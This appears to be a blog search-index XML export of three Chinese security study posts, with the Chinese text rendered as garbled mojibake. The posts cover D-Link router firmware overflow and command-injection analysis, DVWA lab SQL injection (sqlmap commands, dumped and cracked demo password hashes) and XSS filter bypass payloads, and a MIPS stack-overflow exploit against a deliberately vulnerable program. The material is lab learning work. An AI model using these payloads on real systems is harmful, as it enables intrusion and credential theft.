<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815æ ˆæº¢å‡ºæ¼æ´žå±¡æ¬¡è°ƒè¯•éƒ½å¤±è´¥äº†ï¼Œæˆ‘æ‰å‘çŽ°åŽŸæ¥è¿™ä¸ªç‰ˆæœ¬çš„DIR-815å·²ç»ä¿®å¤äº†(DIR-815_REVB_FIRMWARE_2.03.B08)ã€‚æ‰€ä»¥è¿™ä¸ªæ ˆæº¢å‡ºæ˜¯ä¸å­˜åœ¨çš„ 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 ç¼“å†²åŒºæº¢å‡ºæ¼æ´žåŠ¨æ€è°ƒè¯•ï¼šåœ¨authenticationcgi_mainå¤„ä¸‹æ–­ç‚¹ æ­¤æ—¶è¿”å›žåœ°å€ä¿å­˜åœ¨è¿™é‡Œï¼š ä¹‹åŽè¿è¡Œåˆ°æ­¤å¤„ï¼š æ­¤æ—¶è¿”å›žåœ°å€è¢«è¦†ç›–äº† ç»§ç»­è¿è¡Œï¼Œç¨‹åºæžœç„¶å´©æºƒäº† è¿›å…¥åˆ°å‡½æ•°sub40A424ç¨‹åºåœ¨æ­¤æ—¶å´©æºƒäº† å°è¯•ä¿®æ”¹passwordé•¿åº¦ç¨‹åºè¿˜æ˜¯å´©æºƒäº†æŸ¥çœ‹åæ±‡ç¼–ä»£ç ç¨‹åºä»Žå¤–éƒ¨è¯»å…¥CONTENT_LENGTHæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read è®¡ç®—åç§»é‡ï¼› åŽé¢çš„åˆ©ç”¨è¿‡ç¨‹æ„Ÿè§‰æ¯”è¾ƒå¤æ‚ï¼Œæ²¡èƒ½æˆåŠŸåœ°å¤çŽ° DIR-645å‘½ä»¤æ‰§è¡Œæ¼æ´žåœ¨å®‰å…¨å®¢ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡åˆ†æžDIR-645å‘½ä»¤æ‰§è¡Œåœ°æ–‡ç« ï¼Œéšåˆ†æžä¸€ä¸‹åŽŸç† ç›´æŽ¥æŸ¥çœ‹servicecgi_mainå‡½æ•° é¦–å…ˆä¼šå¯¹è¯·æ±‚æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœæ˜¯POSTæ–¹æ³•åˆ™ä¼šè°ƒç”¨cgibin_parse_requestè§£æžå‚æ•°ï¼Œå…·ä½“çš„å®žçŽ°æš‚æ—¶ä¸è€ƒè™‘ï¼Œä¸»è¦æ˜¯è§£æžCONTENT_TYPEå’ŒCONTENT_LENGTH,ä¹‹åŽä¼šè°ƒç”¨sess_ispoweruseråˆ¤æ–­æ˜¯å¦ä¸ºåˆæ³•ç”¨æˆ·ä¹‹åŽèŽ·å– POST è¡¨å•å­—æ®µï¼Œè‹¥å­—æ®µåä¸º EVENT çš„è¯ï¼Œå°±å°† â€œevent %s &gt; /dev/nullâ€ ä½œä¸ºå‚æ•°æ‰§è¡Œ lxmldbc_system å‡½æ•°ã€‚æŸ¥çœ‹lxmldbc_systemå‡½æ•°123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen ä¸»è¦å…³æ³¨æœ€åŽä¸¤æ¡æŒ‡ä»¤ï¼Œå› ä¸ºè¿™é‡Œç”¨åˆ°äº†MIPSä¸­åœ°åˆ†æ”¯å»¶è¿Ÿæ§½æŠ€æœ¯ï¼Œæ‰€ä»¥$a1ä¼ é€’å‚æ•°çš„æŒ‡ä»¤å­˜æ”¾åœ¨jalræŒ‡ä»¤ä¹‹åŽæ•…vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4)vsnprintfå‡½æ•°çš„ç”¨æ³•ï¼š å‡½æ•°åŽŸåž‹ï¼šint vsnprintf(char str, size_t size, const char format,va_list ap);å‡½æ•°è¯´æ˜Žï¼šå°†å¯å˜å‚æ•°æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªå­—ç¬¦æ•°ç»„å‚æ•°ï¼šstrè¾“å‡ºåˆ°çš„æ•°ç»„ï¼ŒsizeæŒ‡å®šå¤§å°ï¼Œé˜²æ­¢è¶Šç•Œï¼Œformatæ ¼å¼åŒ–å‚æ•°ï¼Œapå¯å˜å‚æ•°åˆ—è¡¨å‡½æ•°ç”¨æ³• æŽ¥ç€è°ƒç”¨systemå‡½æ•°12jalr $t9 ; systemmove $a0, $s0 # command çœ‹ä¸€ä¸‹å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ $s0æœ¬æ¥æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªå˜é‡ï¼Œvsnprintfå°†å¯å˜å‚æ•°æ ¼å¼åŒ–è¾“å‡ºåˆ°å…¶ä¸­ï¼Œä¹‹åŽåˆå°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™systemå‡½æ•° ç›¸å½“äºŽæ‰§è¡Œäº†system(&quot;event %s &gt; /dev/null&quot;) è¿™æ ·å°±å¯ä»¥æƒ³åŠžæ³•è¿›è¡Œå‘½ä»¤æ³¨å…¥äº† å‚è€ƒè·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹ DIR-815 æ ˆæº¢å‡ºæ¼æ´žåˆ†æž]]></content>
      <categories>
        <category>IOT</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DVWAå­¦ä¹ ]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWAç”¨çš„vulstudyçš„çŽ¯å¢ƒé»˜è®¤ç”¨æˆ·åæ˜¯adminå¯†ç æ˜¯passwordéœ€è¦å¯åŠ¨çš„æ—¶å€™docker-compose up -då°±è¡Œäº†åœæ­¢çš„è¯docker-compose stopåœæ­¢å®¹å™¨ sqlæ³¨å…¥ æœ€ç®€å•çš„æ²¡åŠžæ³•æ˜¯æˆ‘å¤ªèœäº†ï¼Œæƒå½“å¤ä¹ å¥½äº†:cry: è¾“å…¥1å¾—åˆ°ï¼š123ID: 1First name: adminSurname: admin ç„¶åŽå¼€å§‹çˆ†å­—æ®µ 1â€™ order by 2 # ç¡®è®¤å›žæ˜¾ä½ç½®ï¼š 1â€™ union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 å¼€å§‹çˆ†æ•°æ®åº“ 1â€™ union select database(),2 #å¾—åˆ°æ•°æ®åº“å123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 å¼€å§‹çˆ†è¡¨è¡¨éƒ½å­˜åœ¨information_schema.tablesè¿™é‡Œé¢ 1â€™ union select table_name,2 from information_schema.tables where table_schema= â€˜dvwaâ€™# å¾—åˆ°ï¼š123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 å¼€å§‹çˆ†å­—æ®µç„¶è€Œæˆ‘å¹¶ä¸çŸ¥é“æ€Žä¹ˆçˆ†å­—æ®µ:disappointed:äºŽæ˜¯çŒœæµ‹æ˜¯password 1â€™ union select password,2 from users å¾—åˆ°äº†ï¼š123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 å°ç™½ä¹‹æ—…åˆ°æ­¤ç»“æŸ å‡çº§åˆ°mediumæ”¹æˆäº†postæ–¹å¼æäº¤æ•°æ®è¿™æ—¶å€™sqlmapæ´¾ä¸Šç”¨åœºäº† å…ˆå°†æŠ“åˆ°çš„æ•°æ®åŒ…ä¿å­˜ä¸ºdvwa.txtæ–‡ä»¶ç„¶åŽ python sqlmap.py -r â€œdvwa.txtâ€ â€”dbs sqlmapå¾ˆèªæ˜Žçš„åˆ¤æ–­å‡ºè¿™æ˜¯MYSQLæ•°æ®åº“å¹¶ä¸”åˆ—å‡ºäº†æ‰€æœ‰çš„æ•°æ®åº“ 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema ä¸è¿‡è¿™ä¸ªpayloadå¾ˆç¥žå¥‡12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit æŒ‡å®šæ•°æ®åº“çˆ†è¡¨ python sqlmap.py -r â€œdvwa.txtâ€ -D dvwa â€”tables å¾—åˆ°ï¼š123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ æŒ‡å®šè¡¨çˆ†å­—æ®µ python sqlmap.py -r â€œdvwa.txtâ€ -D dvwa -T users â€”columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ æŒ‡å®šè¡¨ç„¶åŽdumpæ•°æ® python sqlmap.py -r â€œdvwa.txtâ€ -D dvwa -T users â€”dump-all sqlmapå¾ˆæœºæ™ºçš„åœ¨ç ´è§£md5123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; å¾—åˆ°çš„è¡¨12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql highè¿™æ—¶å€™å°±å¾ˆã€‚ã€‚ ä¼šå¼¹å‡ºä¸€ä¸ªé¡µé¢ï¼Œè¾“å…¥æ•°æ®ä¹‹åŽå†è·³å›žæ¥è¿™å°±å¾ˆå®‰å…¨äº†:stuck_out_tongue:ä½†æ˜¯ã€‚ã€‚æŸ¥çœ‹æºç ä¹‹åŽå‘çŽ°ï¼šå…¶å®žæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼›123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); æ‰€ä»¥payloadç…§æ ·ç”¨ï¼Œæ²¡é—®é¢˜ impossibleè¿™æ¬¡å°±æ›´ä¸ä¸€èˆ¬äº†123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; è¿™é‡Œç”¨åˆ°äº†PDOé¢„ç¼–è¯‘çš„æ–¹å¼é‚£å¯èƒ½å°±çœŸçš„æ²¡åŠžæ³•äº† çœ‹äº†ä¸‹stackoverflowHow can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ï¼š1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; æˆ–è€…å¯¹äºŽmysqlæ¥è¯´ï¼Œå¯ä»¥ï¼š123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = $result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDOçœŸçš„æ˜¯å®‰å…¨çš„å—ï¼ŸAre PDO prepared statements sufficient to prevent SQL injection?SQL injection that gets around mysql_real_escape_string() XSS reflectedç¬¬ä¸€éåœ¨chromeä¸Šè¯•äº†ä¸‹&lt;script&gt;alert(1)&lt;/script&gt;æ²¡æˆåŠŸä½†æ˜¯çœ‹æºç ï¼š å¯èƒ½æ˜¯chromeå¤ªå®‰å…¨äº†å§æ¢æˆfirefoxå°±æ²¡äº‹äº† mediumå¦‚æžœçœ‹æºç å°±ä¼šå‘çŽ°åªæ˜¯ç®€å•åœ°å¯¹scriptè¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤ $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );é‚£ä¹ˆå¦‚ä½•ç»•è¿‡è¿™ä¸ªé™åˆ¶å‘¢ é‚£å°±è¿™æ ·æž„é€ &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;å°±èƒ½ç»•è¿‡è¿‡æ»¤äº†ï¼Œä¸»è¦é—®é¢˜è¿˜æ˜¯è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œä¹‹è¿‡æ»¤äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥åŒå†™å°±èƒ½å¾ˆå®¹æ˜“åœ°ç»•è¿‡äº† ps. å¤§å°å†™ä¹Ÿå¯ä»¥ highè¿™æ¬¡è¿‡æ»¤æ›´ä¸¥æ ¼äº†$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); æœ€åŽåªç•™äº†ä¸€ä¸ª&gt;ç»™ä½  æžœç„¶æˆ‘è®°å¾—è¿˜æœ‰imgæ ‡ç­¾ä¹Ÿå¯ä»¥é€ æˆxssæ¥ç€&lt;img src=&quot;aa&quot; onError=alert(123) &gt;è¿™æ ·å°±è¡Œå•¦ï¼Œå½“ç„¶chromeå¤ªå®‰å…¨äº†ï¼Œè¿˜æ˜¯ç”¨firefoxå§ impossible1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; è¿™ç§æƒ…å†µä¸‹è¿˜è¿›è¡Œäº†å®žä½“ç¼–ç ï¼Œçœ‹ä½ æ€Žä¹ˆç»•è¿‡ é‚£äº›å¹´æˆ‘ä»¬æ²¡èƒ½bypassçš„xss filter ä¸€ç¯‡æ€»ç»“äº†xssçš„æ–‡ç«  sql ç›²æ³¨ä»Žlowå¼€å§‹çœ‹èµ·ï¼Œç›´æŽ¥æŠ“åŒ…ç„¶åŽå°†æ•°æ®åŒ…ä¿å­˜èµ·æ¥ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹å°±å°±å‡ºæ¥äº†ï¼Œ-rå‚æ•°æ˜¯è¯»å–ä¸€ä¸ªæ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ï¼Œç„¶åŽsqlmapä¼šè‡ªåŠ¨è§£æžå®ƒ mediumeä¸€æ ·çš„ï¼Œåªæ˜¯æ•°æ®åŒ…å˜æˆäº†postæ–¹å¼æäº¤çš„ highè¿™æ¬¡sqlmapæŠ½é£Žæ²¡è·‘å‡ºæ¥çœ‹ä¸‹æºç å¥½äº†æœ¬æ¥ç›²æ³¨å°±æ˜¯è¦é€šè¿‡è„šæœ¬æ¥è·‘çš„ï¼Œä½†æ˜¯æˆ‘æ¯”è¾ƒæ‡’emmmï¼Œè¿˜æ˜¯è¦å¤ä¹ ä¸€ä¸‹å¦‚ä½•ç”¨pythonè„šæœ¬è·‘å‡ºæ¥ å¦‚ä½•ç›²æ³¨ï¼Ÿ ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£ SQL ç›²æ³¨ ç›²æ³¨æœ€å¸¸è§çš„ä¸€ä¸ªpayload127.0.0.1/sqllib/Less-5/?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80â€“+ åˆ¤æ–­æ•°æ®åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå¦ä¸ºâ€™Pâ€™ xss å­˜å‚¨åž‹è¿˜æ˜¯æœ€ç®€å•çš„lowè¡¨å•ä¸Šçš„nameæœ‰é•¿åº¦é™åˆ¶ï¼Œä¸è¿‡è¿™åªæ˜¯å‰ç«¯çš„é™åˆ¶è€Œå·²&lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt;æ³¨å…¥æˆåŠŸ mediumè¿™å°±å¾ˆå°´å°¬äº†ã€‚ã€‚åŽŸæ¥è¿™å°±æ˜¯å­˜å‚¨åž‹xssçš„åŽ‰å®³äº†ï¼Œç›´æŽ¥å­˜è¿›åŽ»äº†ï¼Œæ‰€ä»¥æˆ‘æ‰“å¼€mediumçš„é¡µé¢æ—¶ï¼Œè¿žç€å¼¹å‡ºäº†ä¸¤ä¸ªæ¡†æ¡†ï¼ŒäºŽæ˜¯æƒ³çœ‹ä¸€ä¸‹å®ƒçš„æºç ï¼š è¿™é‡Œä¹Ÿæ˜¯é€šè¿‡å¤§å°å†™æˆ–è€…åŒå†™å°±èƒ½ç»•è¿‡çš„ &lt;sCriPt&gt;alert(1)&lt;/script&gt; æ‰¾åˆ°äº†ä¸€ä¸ªxsså¹³å° xsså¹³å° ä½†æ˜¯æˆ‘å‘çŽ°æˆ‘ä¸ä¼šç”¨äº†ã€‚ã€‚]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[IOT æ ˆæº¢å‡ºç¬”è®°]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MIPSæ ˆæº¢å‡ºx86å’ŒMIPSæŒ‡ä»¤é›†åœ¨æˆ‘çš„ç†è§£çœ‹æ¥ï¼Œx86å¯¹äºŽæ ˆçš„æ“ä½œå¤šäº†pushå’Œpopæ“ä½œï¼Œè€ŒMIPSæŒ‡ä»¤é›†å¹¶æ²¡æœ‰è¿™äº›ï¼ŒåŒæ—¶ä¸¤è€…ä¸€ä¸ªæ˜¯å°ç«¯åºï¼Œä¸€ä¸ªæ˜¯å¤§ç«¯åºï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåœ¨è°ƒè¯•ç¨‹åºçš„æ—¶å€™ä¾æ—§ç”¨çš„æ˜¯å°ç«¯åºemmmm MISPæŒ‡ä»¤é›†å­˜åœ¨æ ˆæº¢å‡ºçš„åŽŸå› å¶å­å‡½æ•°å’Œéžå¶å­å‡½æ•° å¶å­å‡½æ•°çš„è¿”å›žåœ°å€æ˜¯ç›´æŽ¥æ”¾åœ¨ ra å¯„å­˜å™¨ä¸­ï¼Œè€Œéžå¶å­å‡½æ•°éœ€è¦è°ƒç”¨å¦å¤–çš„å‡½æ•°ï¼Œè¿™é‡Œçš„å·®å¼‚å°±ç…§æˆäº†éžå¶å­å‡½æ•°éœ€è¦æŠŠå½“å‰çš„è¿”å›žåœ°å€æš‚æ—¶å­˜æ”¾åœ¨æ ˆä¸Š å®žéªŒçŽ¯å¢ƒattifyOSè™šæ‹Ÿæœºï¼ŒåŸºæœ¬å†…ç½®äº†æˆ‘éœ€è¦çš„æ‰€æœ‰å·¥å…·ï¼Œå½“ç„¶å…¶ä¸­çš„IDAä¼¼ä¹Žè¿‡æœŸäº†ï¼ŒåŽ»å¾çˆ±ç ´è§£ä¸Šæ‰¾äº†ä¸€ä¸ªLinuxç‰ˆæœ¬çš„IDAå®‰è£…äº† å¾çˆ±ç ´è§£é“¾æŽ¥ MIPSåŠ¨æ€è°ƒè¯•ä½¿ç”¨qemu-mipselæˆ–è€…qemu-mipsel-staticè¿›è¡Œè°ƒè¯•ï¼Œqemuæ”¯æŒä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œ-gé€‰é¡¹å¼€å¯ä¸€ä¸ªç«¯å£ï¼ŒIDAå¯ä»¥è¿žæŽ¥ä¸Šè¿™ä¸ªç«¯å£ä»Žè€Œè¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚ä¹‹å‰åœ¨çœ‹é›ªçš„è™šæ‹Ÿæœºä¸Šåªèƒ½ç”¨qemu-mipsel-staticè°ƒè¯•ï¼ŒåŽæ¥æ¢æˆäº†attifyOSå‘çŽ°ä¸¤è€…éƒ½è¡Œã€‚ä¸è¿‡å¦‚æžœç¼ºå°‘åŠ¨æ€é“¾æŽ¥åº“çš„è¯è¿˜æ˜¯éœ€è¦chrootåŒæ—¶å°†ç›¸åº”çš„åº“æ‹·è´è¿‡æ¥ã€‚ ç®€å•çš„æ ˆæº¢å‡ºæºç ï¼š123456789101112131415#include &lt;stdio.h&gt;void vuln()&#123; system(&quot;/bin/sh&quot;);&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf(&quot;copy success!n&quot;);&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125; ä½¿ç”¨mipsel-linux-gccè¿›è¡Œç¼–è¯‘ mipsel-linux-gcc ./stack01.c -o stack01 -static ç¼–è¯‘ä¹‹åŽå¾—åˆ°ï¼šroot@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped ä½¿ç”¨IDAæŸ¥çœ‹åæ±‡ç¼–ï¼š ç”±äºŽmainå‡½æ•°ä¸­è°ƒç”¨äº†å…¶ä»–çš„å‡½æ•°ï¼Œæ‰€ä»¥mainå‡½æ•°å¿…ç„¶æ˜¯éžå¶å­å‡½æ•°ï¼Œå½“ç„¶è¿™é‡Œæˆ‘ä»¬ä¸æ˜¯è¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ï¼Œå› ä¸ºhas_stackå‡½æ•°ä¹Ÿæ˜¯éžå¶å­å‡½æ•°ï¼Œè€Œä¸”strcpyæ²¡æœ‰å¯¹é•¿åº¦åšé™åˆ¶ã€‚ strcpyçš„ç¬¬ä¸€ä¸ªå‚æ•°dstå­˜æ”¾åœ¨$a0ä¸­ï¼Œç¬¬äºŒä¸ªå‚æ•°srcå­˜æ”¾åœ¨$a1ä¸­ï¼Œ123456789.text:00400410 sw $zero, 0x38+var_10($fp).text:00400414 addiu $v0, $fp, 0x38+var_20 #è¦æ‹·è´åˆ°çš„åœ°æ–¹.text:00400418 move $a0, $v0.text:0040041C lw $a1, 0x38+arg_0($fp) # è¦æ‹·è´çš„å†…å®¹.text:00400420 la $v0, strcpy.text:00400424 move $t9, $v0.text:00400428 jalr $t9 ; strcpy.text:0040042C nop.text:00400430 lw $gp, 0x38+var_28($fp) å·æ‡’ä¸€ç‚¹ä¸ä»”ç»†åˆ†æžæ ˆäº† ä½¿ç”¨patternLocOffset.pyå·¥å…·ç”Ÿæˆé•¿åº¦ä¸º30çš„å­—ç¬¦ä¸²12345/home/oit [oit@ubuntu] [4:31]&gt; python patternOffset.py -c -l 30[*] Create pattern string contains 30 characters ok![+] output to patternShell.txt ok![+] take time: 0.0004 s åŠ¨æ€è°ƒè¯•ï¼š./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9 ç›´æŽ¥åœ¨è°ƒç”¨å‡½æ•°è¿”å›žçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ­¤æ—¶çš„$raå¯„å­˜å™¨çš„å€¼12345.text:00400450 move $sp, $fp.text:00400454 lw $ra, 0x38+var_4($sp).text:00400458 lw $fp, 0x38+var_8($sp).text:0040045C addiu $sp, 0x38.text:00400460 jr $ra (æ–­ç‚¹) è®¡ç®—éœ€è¦paddingçš„é•¿åº¦12345&gt; python patternOffset.py -s 0x62413961 -l 30[*] Create pattern string contains 30 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 28 (adjusted another-endian)[+] take time: 0.0008 s éœ€è¦å¡«å……28ä¸ªå­—èŠ‚ æœ€åŽçš„payload ./qemu-mipsel-static -g 1234 ./stack01 `python -c â€œprint â€˜aâ€™*28+â€™\x90\x03\x40\x00â€™â€` æ­¤æ—¶æˆåŠŸåœ°å‘ç”Ÿäº†è·³è½¬ 12345root@ubuntu:~/stack# ./qemu-mipsel-static ./stack01 `python -c 